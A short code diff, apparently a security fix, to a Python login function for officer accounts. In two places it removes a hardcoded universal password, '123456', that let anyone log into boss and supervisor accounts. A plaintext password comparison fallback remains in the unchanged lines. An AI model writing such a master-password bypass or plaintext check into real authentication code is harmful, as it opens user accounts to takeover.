@@ -460,7 +460,7 @@ def verify_officer_login(email, password):
                         valid = check_password_hash(db_pwd, password)
                     else:
                         valid = (db_pwd == password)
-                    if valid or password == "123456":
+                    if valid:
                         status = boss_row[8] if len(boss_row) > 8 and boss_row[8] else "active"
                         if status == "pending_approval":
                             return {
@@ -518,7 +518,7 @@ def verify_officer_login(email, password):
                         valid = check_password_hash(db_pwd, password)
                     else:
                         valid = (db_pwd == password)
-                    if valid or password == "123456":
+                    if valid:
                         status = sup_row[9] if len(sup_row) > 9 and sup_row[9] else "active"
                         if status == "pending_approval":
                             return {
